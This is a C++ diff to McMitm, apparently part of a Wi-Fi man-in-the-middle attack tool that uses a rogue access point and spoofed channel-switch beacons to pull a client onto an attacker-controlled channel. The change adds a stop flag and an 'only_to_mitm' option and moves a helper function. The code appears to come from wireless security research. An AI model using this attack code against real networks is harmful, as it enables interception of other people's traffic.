@@ -22,7 +22,8 @@ McMitm::McMitm(const ActorPtr &rogue_sta,
                const ActorPtr &rogue_ap,
                string ssid,
                const string &ap_mac,
-               const string &client_mac
+               const string &client_mac,
+               const bool only_to_mitm
 )
     : rogue_sta(rogue_sta),
       rogue_ap(rogue_ap),
@@ -30,7 +31,8 @@ McMitm::McMitm(const ActorPtr &rogue_sta,
       nic_rogue_ap(AP_IFACE_PREFIX + rogue_ap["iface"]),
       ssid(std::move(ssid)),
       ap_mac(ap_mac),
-      client_mac(client_mac){}
+      client_mac(client_mac),
+      only_to_mitm(only_to_mitm){}
 
 McMitm::~McMitm(){ stop(); }
 
@@ -43,7 +45,7 @@ void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &t
         //FIXME
         const NetworkInterface iface(rogue_sta["iface"]);
         CSA_attack::send_CSA_beacon(ap_mac, iface, ssid,
-            netconfig.real_channel,  netconfig.rogue_channel);
+                                    netconfig.real_channel,  netconfig.rogue_channel);
 
         // Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
         // followed by one with a value of 1. When starting with 1 it errors out.
@@ -212,7 +214,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
     auto next_beacon  = steady_clock::now() + milliseconds(10);
     const auto start_time = steady_clock::now();
 
-    while (true) {
+    while (!stop_mitm) {
         if (timeout_sec > 0 && steady_clock::now() > start_time + seconds(timeout_sec)) {
             log(LogLevel::INFO, "McMitm timeout reached, stopping.");
             break;
@@ -249,7 +251,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 
         if (next_beacon <= steady_clock::now()) {
             const bool client_associated = clients.contains(client_mac.to_string()) &&
-            clients.at(client_mac.to_string())->state >= ClientState::GotMitm;
+                    clients.at(client_mac.to_string())->state >= ClientState::GotMitm;
             if(!client_associated)
                 send_csa_beacon(1);
             next_beacon += milliseconds(100);
@@ -273,11 +275,6 @@ void McMitm::stop(){
     stop_ap(nic_rogue_ap, nullopt);
     sock_real.reset();
     sock_rogue.reset();
-}
-
-ClientState *McMitm::find_client(const string &mac){
-    const auto it = clients.find(mac);
-    return (it != clients.end()) ? it->second.get() : nullptr;
 }
 
 void McMitm::patch_channel_raw(vector<uint8_t> &beacon_raw, const uint8_t channel){
@@ -307,5 +304,10 @@ void McMitm::patch_channel_raw(vector<uint8_t> &beacon_raw, const uint8_t channe
         pos += 2 + len;
     }
 
+}
+
+ClientState *McMitm::find_client(const string &mac){
+    const auto it = clients.find(mac);
+    return (it != clients.end()) ? it->second.get() : nullptr;
 }
 }
